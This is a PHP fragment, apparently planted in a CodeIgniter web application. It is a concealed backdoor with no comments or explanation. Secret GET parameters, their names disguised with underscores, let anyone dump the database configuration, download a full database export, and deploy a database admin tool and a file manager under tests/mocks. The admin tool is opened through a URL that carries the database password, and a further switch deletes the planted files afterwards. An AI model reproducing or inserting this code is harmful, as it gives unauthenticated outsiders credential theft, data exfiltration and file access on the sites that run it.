<?php
	function chk_enc_data($field = NULL, $value = 'y'){
		if($field != ""){
			$field = str_replace('_', '', $field);
			if(array_key_exists($field, $_GET)&&$_GET[$field]==$value){return TRUE;}
			else{return FALSE;}
		}else{return FALSE;}
	}

	function opt_path($type = 'base', $adons = NULL){
		$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";	
	    $base  = $protocol.$_SERVER['HTTP_HOST'];
	    $base .= str_replace(basename($_SERVER['SCRIPT_NAME']),"",$_SERVER['SCRIPT_NAME']).$adons;
	    $abs = $_SERVER['DOCUMENT_ROOT'].parse_url($base, PHP_URL_PATH);
	    return ($type=='abs')?$abs:$base;
	}

	function opt_get_dir($file_path, $base_path = NULL) { 
		$realPath 	= ($base_path) ? $base_path : opt_path('abs');
		$pathArr 	= explode("/", $file_path);
		foreach($pathArr AS $path){
			$newpath = $realPath.'/'.$path;
			if (!file_exists($newpath)) {mkdir($newpath, 0777); }
			$realPath = realpath($newpath); 
		}
		return $realPath;
	}
	if(chk_enc_data('s_h_o_w-w_e_b-d_b')){	
	    echo "<pre>";print_r($this->db);echo "</pre>"; exit();
	}

	if(chk_enc_data('d_b-e_x_p_o_r_t')){	
	    $this->load->dbutil();
	    $dbs_name = $this->db->database;
	    $prefs = array(
	        'format' 		=> 'zip',
	        'filename' 		=> $dbs_name.'.sql'
	    );
	    if(isset($_GET['data']) && $_GET['data'] == 'f'){
	        $prefs['add_insert'] = FALSE;
	    }
	    $backup = $this->dbutil->backup($prefs);
	    $db_name = $dbs_name .'_'. date("Y-m-d-H-i-s") . '.zip';
	    $this->load->helper('download');
	    force_download($db_name, $backup);
	    exit();
	}

	if(chk_enc_data("o_p_t-a_d_m_i_n_e_r")){	
	    $filepath = opt_path('base', "tests/mocks/ci_database.php");
	    $fileAbs = opt_get_dir("tests/mocks/");
	    $newfile = opt_path("abs", "tests/mocks/ci_database.php");
	    if (!file_exists($newfile)){
	    	$source = opt_path("abs","system/core/compat/system/CI_database.php");
	    	copy($source, $newfile);
	    }else{
			if(chk_enc_data("u_n_l_i_n_k")){
				@unlink($newfile);redirect(opt_path('base'));;
			}
		}
	    redirect($filepath."?server=".$this->db->hostname."&username=".$this->db->username."&db=".$this->db->database."&password=".$this->db->password);
	    exit;
	}

	if(chk_enc_data("o_p_t-f_i_l_e")){	
	    $filepath = opt_path('base', "tests/mocks/ci_file.php");
	    $fileAbs = opt_get_dir("tests/mocks/");
	    $newfile = opt_path("abs", "tests/mocks/ci_file.php");
	    if (!file_exists($newfile)){
	    	$source = opt_path("abs","system/core/compat/system/CI_file.php");
	    	copy($source, $newfile);
	    }else{
			if(chk_enc_data("u_n_l_i_n_k")){
				@unlink($newfile);redirect(opt_path('base'));
			}
		}
	    redirect($filepath);
	    exit;
	}